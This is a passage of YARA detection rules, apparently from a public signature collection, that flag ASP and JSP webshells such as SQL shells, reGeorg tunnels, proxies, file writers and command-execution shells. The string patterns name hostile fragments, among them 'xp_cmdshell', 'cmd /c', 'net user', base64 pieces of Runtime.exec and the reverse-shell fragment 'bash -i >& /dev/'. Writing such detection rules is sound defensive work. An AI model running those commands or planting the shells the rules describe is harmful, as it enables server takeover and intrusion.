		$sql6 = "SQLClient" fullword wide ascii
		$sql7 = "Open" fullword wide ascii
		$sql8 = "SqlCommand" fullword wide ascii
		$sql9 = "SQLCommand" fullword wide ascii
		$o_sql1 = "SQLOLEDB" fullword wide ascii
		$o_sql2 = "CreateObject" fullword wide ascii
		$o_sql3 = "open" fullword wide ascii
		$a_sql1 = "ADODB.Connection" fullword wide ascii
		$a_sql2 = "adodb.connection" fullword wide ascii
		$a_sql3 = "CreateObject" fullword wide ascii
		$a_sql4 = "createobject" fullword wide ascii
		$a_sql5 = "open" fullword wide ascii
		$c_sql1 = "System.Data.SqlClient" fullword wide ascii
		$c_sql2 = "sqlConnection" fullword wide ascii
		$c_sql3 = "open" fullword wide ascii
		$sus1 = "shell" fullword nocase wide ascii
		$sus2 = "xp_cmdshell" fullword nocase wide ascii
		$sus3 = "aspxspy" fullword nocase wide ascii
		$sus4 = "_KillMe" wide ascii
		$sus5 = "cmd.exe" fullword wide ascii
		$sus6 = "cmd /c" fullword wide ascii
		$sus7 = "net user" fullword wide ascii
		$sus8 = "\\x2D\\x3E\\x7C" wide ascii
		$sus9 = "Hacker" fullword wide ascii
		$sus10 = "hacker" fullword wide ascii
		$sus11 = "HACKER" fullword wide ascii
		$sus12 = "webshell" wide ascii
		$sus13 = "equest[\"sql\"]" wide ascii
		$sus14 = "equest(\"sql\")" wide ascii
		$sus15 = { e5 bc 80 e5 a7 8b e5 af bc e5 }
		$sus16 = "\"sqlCommand\"" wide ascii
		$sus17 = "\"sqlcommand\"" wide ascii
		$slightly_sus3 = "SHOW COLUMNS FROM " wide ascii
		$slightly_sus4 = "show columns from " wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii

	condition:
		(( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and (6 of ($sql*) or all of ($o_sql*) or 3 of ($a_sql*) or all of ($c_sql*)) and (( filesize <150KB and any of ($sus*)) or ( filesize <5KB and any of ($slightly_sus*)))
}
rule SIGNATURE_BASE_WEBSHELL_ASP_Scan_Writable : FILE {
    meta:
		description = "ASP webshell searching for writable directories (to hide more webshells ...)"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "1766e081-0591-59ab-b546-b13207764b4d"
		date = "2021-03-14"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5358-L5501"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2409eda9047085baf12e0f1b9d0b357672f7a152"
		hash = "af1c00696243f8b062a53dad9fb8b773fa1f0395631ffe6c7decc42c47eedee7"
		logic_hash = "80969fd0c27903dabf08a250a47971725ac5762fd2f9afd96167b8f88f277348"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$scan1 = "DirectoryInfo" nocase fullword wide ascii
		$scan2 = "GetDirectories" nocase fullword wide ascii
		$scan3 = "Create" nocase fullword wide ascii
		$scan4 = "File" nocase fullword wide ascii
		$scan5 = "System.IO" nocase fullword wide ascii
		$scan6 = "CanWrite" nocase fullword wide ascii
		$scan7 = "Delete" nocase fullword wide ascii
		$sus1 = "upload" nocase fullword wide ascii
		$sus2 = "shell" nocase wide ascii
		$sus3 = "orking directory" nocase fullword wide ascii
		$sus4 = "scan" nocase wide ascii
		$tagasp_short1 = /<%[^"]/ wide ascii
		$tagasp_short2 = "%>" wide ascii
		$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
		$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
		$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
		$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
		$tagasp_long10 = "<%@ " wide ascii
		$tagasp_long11 = /<% \w/ nocase wide ascii
		$tagasp_long12 = "<%ex" nocase wide ascii
		$tagasp_long13 = "<%ev" nocase wide ascii
		$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
		$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
		$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
		$php1 = "<?php"
		$php2 = "<?="
		$jsp1 = "=\"java." wide ascii
		$jsp2 = "=\"javax." wide ascii
		$jsp3 = "java.lang." wide ascii
		$jsp4 = "public" fullword wide ascii
		$jsp5 = "throws" fullword wide ascii
		$jsp6 = "getValue" fullword wide ascii
		$jsp7 = "getBytes" fullword wide ascii
		$perl1 = "PerlScript" fullword
		$asp_input1 = "request" fullword nocase wide ascii
		$asp_input2 = "Page_Load" fullword nocase wide ascii
		$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
		$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
		$asp_xml_method1 = "GET" fullword wide ascii
		$asp_xml_method2 = "POST" fullword wide ascii
		$asp_xml_method3 = "HEAD" fullword wide ascii
		$asp_form1 = "<form " wide ascii
		$asp_form2 = "<Form " wide ascii
		$asp_form3 = "<FORM " wide ascii
		$asp_asp = "<asp:" wide ascii
		$asp_text1 = ".text" wide ascii
		$asp_text2 = ".Text" wide ascii

	condition:
		filesize <10KB and (( any of ($tagasp_long*) or any of ($tagasp_classid*) or ($tagasp_short1 and $tagasp_short2 in ( filesize -100.. filesize )) or ($tagasp_short2 and ($tagasp_short1 in (0..1000) or $tagasp_short1 in ( filesize -1000.. filesize )))) and not (( any of ($perl*) or $php1 at 0 or $php2 at 0) or ((#jsp1+#jsp2+#jsp3)>0 and (#jsp4+#jsp5+#jsp6+#jsp7)>0))) and ( any of ($asp_input*) or ($asp_xml_http and any of ($asp_xml_method*)) or ( any of ($asp_form*) and any of ($asp_text*) and $asp_asp)) and 6 of ($scan*) and any of ($sus*)
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Regeorg : FILE {
    meta:
		description = "Webshell regeorg JSP version"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "cbb90005-d8f8-5c64-85d1-29e466f48c25"
		date = "2021-01-24"
		modified = "2023-04-05"
		reference = "https://github.com/sensepost/reGeorg"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5503-L5553"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
		hash = "650eaa21f4031d7da591ebb68e9fc5ce5c860689"
		hash = "00c86bf6ce026ccfaac955840d18391fbff5c933"
		hash = "6db49e43722080b5cd5f07e058a073ba5248b584"
		hash = "9108a33058aa9a2fb6118b719c5b1318f33f0989"
		logic_hash = "0fc038262f6e0463c45ef90bd01d08269bc34d3859d1b61904cc6de03db7c721"
		score = 75
		quality = 50
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$jgeorg1 = "request" fullword wide ascii
		$jgeorg2 = "getHeader" fullword wide ascii
		$jgeorg3 = "X-CMD" fullword wide ascii
		$jgeorg4 = "X-STATUS" fullword wide ascii
		$jgeorg5 = "socket" fullword wide ascii
		$jgeorg6 = "FORWARD" fullword wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide

	condition:
		filesize <300KB and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and all of ($jgeorg*)
}
rule SIGNATURE_BASE_WEBSHELL_JSP_HTTP_Proxy : FILE {
    meta:
		description = "Webshell JSP HTTP proxy"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "55be246e-30a8-52ed-bc5f-507e63bbfe16"
		date = "2021-01-24"
		modified = "2023-07-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5555-L5603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2f9b647660923c5262636a5344e2665512a947a4"
		hash = "97c1e2bf7e769d3fc94ae2fc74ac895f669102c6"
		hash = "2f9b647660923c5262636a5344e2665512a947a4"
		logic_hash = "0a9aa309ca9ef19b5d2bb039906d5a610e26b61c98135d8cabf9ea5924cd46db"
		score = 75
		quality = 50
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$jh1 = "OutputStream" fullword wide ascii
		$jh2 = "InputStream" wide ascii
		$jh3 = "BufferedReader" fullword wide ascii
		$jh4 = "HttpRequest" fullword wide ascii
		$jh5 = "openConnection" fullword wide ascii
		$jh6 = "getParameter" fullword wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide

	condition:
		filesize <10KB and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and all of ($jh*)
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Writer_Nano : FILE {
    meta:
		description = "JSP file writer"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "422a18f2-d6d4-5b42-be15-1eafe44e01cf"
		date = "2021-01-24"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5605-L5686"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ac91e5b9b9dcd373eaa9360a51aa661481ab9429"
		hash = "c718c885b5d6e29161ee8ea0acadb6e53c556513"
		hash = "9f1df0249a6a491cdd5df598d83307338daa4c43"
		hash = "5e241d9d3a045d3ade7b6ff6af6c57b149fa356e"
		logic_hash = "8cf47fe03845f39d7ff7ba4ad8f44a879cdf1aba0869921c5adf6d7490bc4174"
		score = 75
		quality = 48
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload1 = ".write" wide ascii
		$payload2 = "getBytes" fullword wide ascii
		$payload3 = ".decodeBuffer" wide ascii
		$payload4 = "FileOutputStream" fullword wide ascii
		$logger1 = "getLogger" fullword ascii wide
		$logger2 = "FileHandler" fullword ascii wide
		$logger3 = "addHandler" fullword ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide
		$jw_sus1 = /getParameter\("."\)/ ascii wide
		$jw_sus4 = "yoco" fullword ascii wide
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide

	condition:
		( any of ($input*) and any of ($req*)) and ( filesize <200 or ( filesize <1000 and any of ($jw_sus*))) and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and (2 of ($payload*) or all of ($logger*))
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic_Tiny : FILE {
    meta:
		description = "Generic JSP webshell tiny"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "7535ade8-fc65-5558-a72c-cc14c3306390"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5688-L5771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8fd343db0442136e693e745d7af1018a99b042af"
		hash = "87c3ac9b75a72187e8bc6c61f50659435dbdc4fde6ed720cebb93881ba5989d8"
		hash = "1aa6af726137bf261849c05d18d0a630d95530588832aadd5101af28acc034b5"
		logic_hash = "fe7f2ab2820520e8964b874a7f9af356db9355f263c821d180e54c774e10530b"
		score = 75
		quality = 48
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$payload1 = "ProcessBuilder" fullword wide ascii
		$payload2 = "URLClassLoader" fullword wide ascii
		$payload_rt1 = "Runtime" fullword wide ascii
		$payload_rt2 = "getRuntime" fullword wide ascii
		$payload_rt3 = "exec" fullword wide ascii
		$jg_sus1 = "xe /c" ascii wide
		$jg_sus2 = /getParameter\("."\)/ ascii wide
		$jg_sus3 = "</pre>" ascii wide
		$jg_sus4 = "BASE64Decoder" fullword ascii wide
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide
		$fixed_cmd1 = "bash -i >& /dev/" ascii wide

	condition:
		(( filesize <1000 and any of ($jg_sus*)) or filesize <250) and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and (( any of ($input*) and any of ($req*)) or ( any of ($fixed_cmd*))) and (1 of ($payload*) or all of ($payload_rt*))
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic : FILE {
    meta:
		description = "Generic JSP webshell"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "7535ade8-fc65-5558-a72c-cc14c3306390"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5773-L5865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4762f36ca01fb9cda2ab559623d2206f401fc0b1"
		hash = "bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1"
		hash = "ee9408eb923f2d16f606a5aaac7e16b009797a07"
		logic_hash = "86be80a7a970657af047ac9d0aaccbcd2cf9afdf0bd891efa8510ffd803530da"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$susp0 = "cmd" fullword nocase ascii wide
		$susp1 = "command" fullword nocase ascii wide
		$susp2 = "shell" fullword nocase ascii wide
		$susp3 = "download" fullword nocase ascii wide
		$susp4 = "upload" fullword nocase ascii wide
		$susp5 = "Execute" fullword nocase ascii wide
		$susp6 = "\"pwd\"" ascii wide
		$susp7 = "\"</pre>" ascii wide
		$susp8 = /\\u00\d\d\\u00\d\d\\u00\d\d\\u00\d\d/ ascii wide
		$susp9 = "*/\\u00" ascii wide
		$fp1 = "command = \"cmd.exe /c set\";"
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide
		$payload1 = "ProcessBuilder" fullword ascii wide
		$payload2 = "processCmd" fullword ascii wide
		$rt_payload1 = "Runtime" fullword ascii wide
		$rt_payload2 = "getRuntime" fullword ascii wide
		$rt_payload3 = "exec" fullword ascii wide

	condition:
		filesize <300KB and not ( uint16(0)==0x5a4d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50) and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and ( any of ($input*) and any of ($req*)) and (1 of ($payload*) or all of ($rt_payload*)) and not any of ($fp*) and any of ($susp*)
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic_Base64 : FILE {
    meta:
		description = "Generic JSP webshell with base64 encoded payload"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "2eabbad2-7d10-573a-9120-b9b763fa2352"
		date = "2021-01-24"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5867-L5942"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8b5fe53f8833df3657ae2eeafb4fd101c05f0db0"
		hash = "1b916afdd415dfa4e77cecf47321fd676ba2184d"
		logic_hash = "543f4e528763c9e40e49b4169c792818a73a23cbbbee25332749626d8e58b1b8"
		score = 75
		quality = 48
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$one1 = "SdW50aW1l" wide ascii
		$one2 = "J1bnRpbW" wide ascii
		$one3 = "UnVudGltZ" wide ascii
		$one4 = "IAdQBuAHQAaQBtAGUA" wide ascii
		$one5 = "SAHUAbgB0AGkAbQBlA" wide ascii
		$one6 = "UgB1AG4AdABpAG0AZQ" wide ascii
		$two1 = "leGVj" wide ascii
		$two2 = "V4ZW" wide ascii
		$two3 = "ZXhlY" wide ascii
		$two4 = "UAeABlAGMA" wide ascii
		$two5 = "lAHgAZQBjA" wide ascii
		$two6 = "ZQB4AGUAYw" wide ascii
		$three1 = "TY3JpcHRFbmdpbmVGYWN0b3J5" wide ascii
		$three2 = "NjcmlwdEVuZ2luZUZhY3Rvcn" wide ascii
		$three3 = "U2NyaXB0RW5naW5lRmFjdG9ye" wide ascii
		$three4 = "MAYwByAGkAcAB0AEUAbgBnAGkAbgBlAEYAYQBjAHQAbwByAHkA" wide ascii
		$three5 = "TAGMAcgBpAHAAdABFAG4AZwBpAG4AZQBGAGEAYwB0AG8AcgB5A" wide ascii
		$three6 = "UwBjAHIAaQBwAHQARQBuAGcAaQBuAGUARgBhAGMAdABvAHIAeQ" wide ascii
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }

	condition:
		($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and not ( uint16(0)==0x5a4d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50) and filesize <300KB and ( any of ($one*) and any of ($two*) or any of ($three*))
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic_Processbuilder : FILE {
    meta:
		description = "Generic JSP webshell which uses processbuilder to execute user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "2a7c5f44-24a1-5f43-996e-945c209b79b1"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5944-L5981"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "82198670ac2072cd5c2853d59dcd0f8dfcc28923"
		hash = "c05a520d96e4ebf9eb5c73fc0fa446ceb5caf343"
		hash = "347a55c174ee39ec912d9107e971d740f3208d53af43ea480f502d177106bbe8"
		hash = "d0ba29b646274e8cda5be1b940a38d248880d9e2bba11d994d4392c80d6b65bd"
		logic_hash = "fffc173cc23e158e319e48097243a64da232151e441c39e4b6ecc2565a82d862"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$exec = "ProcessBuilder" fullword wide ascii
		$start = "start" fullword wide ascii
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide

	condition:
		filesize <2000 and ( any of ($input*) and any of ($req*)) and $exec and $start
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic_Reflection : FILE {
    meta:
		description = "Generic JSP webshell which uses reflection to execute user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "806ffc8b-1dc8-5e28-ae94-12ad3fee18cd"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L5983-L6064"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "62e6c6065b5ca45819c1fc049518c81d7d165744"
		hash = "bf0ff88cbb72c719a291c722ae3115b91748d5c4920afe7a00a0d921d562e188"
		logic_hash = "8142b67c428072ddce2543c014ad53023265cb36c5b77346590db8c68afcd9db"
		score = 75
		quality = 0
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$ws_exec = "invoke" fullword wide ascii
		$ws_class = "Class" fullword wide ascii
		$fp = "SOAPConnection"
		$cjsp_short1 = "<%" ascii wide
		$cjsp_short2 = "%>" wide ascii
		$cjsp_long1 = "<jsp:" ascii wide
		$cjsp_long2 = /language=[\"']java[\"\']/ ascii wide
		$cjsp_long3 = "/jstl/core" ascii wide
		$cjsp_long4 = "<%@p" nocase ascii wide
		$cjsp_long5 = "<%@ " nocase ascii wide
		$cjsp_long6 = "<% " ascii wide
		$cjsp_long7 = "< %" ascii wide
		$input1 = "getParameter" fullword ascii wide
		$input2 = "getHeaders" fullword ascii wide
		$input3 = "getInputStream" fullword ascii wide
		$input4 = "getReader" fullword ascii wide
		$req1 = "request" fullword ascii wide
		$req2 = "HttpServletRequest" fullword ascii wide
		$req3 = "getRequest" fullword ascii wide
		$cj_encoded1 = "\"java.util.Base64$Decoder\"" ascii wide

	condition:
		all of ($ws_*) and ($cjsp_short1 at 0 or any of ($cjsp_long*) or $cjsp_short2 in ( filesize -100.. filesize ) or ($cjsp_short2 and ($cjsp_short1 in (0..1000) or $cjsp_short1 in ( filesize -1000.. filesize )))) and not $fp and ( filesize <10KB and ( any of ($input*) and any of ($req*)) or ( filesize <30KB and any of ($cj_encoded*) and math.entropy(500, filesize -500)>=5.5 and math.mean(500, filesize -500)>80 and math.deviation(500, filesize -500,89.0)<23))
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Generic_Classloader : FILE {
    meta:
		description = "Generic JSP webshell which uses classloader to execute user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "037e6b24-9faf-569b-bb52-dbe671ab2e87"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L6066-L6143"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6b546e78cc7821b63192bb8e087c133e8702a377d17baaeb64b13f0dd61e2347"
		hash = "f3a7e28e1c38fa5d37811bdda1d6b0893ab876023d3bd696747a35c04141dcf0"
		hash = "8ea2a25344e6094fa82dfc097bbec5f1675f6058f2b7560deb4390bcbce5a0e7"
		hash = "b9ea1e9f91c70160ee29151aa35f23c236d220c72709b2b75123e6fa1da5c86c"
		hash = "80211c97f5b5cd6c3ab23ae51003fd73409d273727ba502d052f6c2bd07046d6"
		hash = "8e544a5f0c242d1f7be503e045738369405d39731fcd553a38b568e0889af1f2"
		logic_hash = "ea7b8a91c09188e04f4c7fffd2b218aac3a83590b7c1b2b141650c0f6965c4ee"
		score = 75
		quality = 0
		tags = "FILE"
